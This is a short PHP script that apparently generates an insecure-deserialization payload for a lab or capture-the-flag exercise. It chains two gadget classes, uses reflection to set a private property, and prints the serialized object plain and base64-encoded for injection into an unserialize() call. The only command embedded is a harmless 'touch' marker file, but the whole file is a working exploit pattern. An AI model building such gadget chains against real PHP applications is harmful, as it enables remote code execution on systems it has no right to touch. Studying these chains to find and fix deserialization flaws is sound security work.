<?php
require("../src/vendor/autoload.php");

$gadgetOne = new \GadgetOne\Adders(shell_exec('touch /tmp/somethingwrong'));
$gadgetTwo = new \GadgetTwo\Echoers();

$reflection = new \ReflectionClass($gadgetTwo);
$property = $reflection->getProperty('klass');
$property->setAccessible(true);
$property->setValue($gadgetTwo, $gadgetOne);

$serializedGadgetTwo = serialize($gadgetTwo);

echo $serializedGadgetTwo;
echo(base64_encode($serializedGadgetTwo));
